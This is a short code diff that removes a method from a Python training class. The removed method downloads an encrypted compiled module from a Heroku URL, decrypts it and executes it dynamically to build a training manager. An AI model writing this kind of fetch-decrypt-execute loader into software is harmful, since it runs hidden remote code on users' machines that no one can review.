@@ -69,35 +69,3 @@ class Train:
             return f"CPU: {ram_used:.2f} GB / {total_ram:.2f} GB used"
 
         return "Unknown device type"
-
-    def get_manager(self):
-        url = "https://desolate-beach-94387-f004ff3976e8.herokuapp.com/"
-        # Download the encrypted model
-        response = requests.get(url + "/get_trainer?a=cli")
-        with open("trainer_encrypted.pyc", "wb") as f:
-            f.write(response.content)
-
-        # Decrypt the model
-        with open("trainer_encrypted.pyc", "rb") as f:
-            decrypted_code = Fernet(self.prep.key).decrypt(f.read())
-
-        # Save the decrypted model temporarily
-        with open("trainer.pyc", "wb") as f:
-            f.write(decrypted_code)
-
-        # Load the model dynamically
-        spec = importlib.util.spec_from_file_location("trainer", "trainer.pyc")
-        model_module = importlib.util.module_from_spec(spec)
-        spec.loader.exec_module(model_module)
-
-        # Instantiate the class
-        manager = model_module.TrainingManager(
-            self.prep.task_type,
-            self.model,
-            self.eval,
-            self.training,
-            self.device,
-            self.tokenizer,
-            self.hyper_params,
-        )
-        return manager
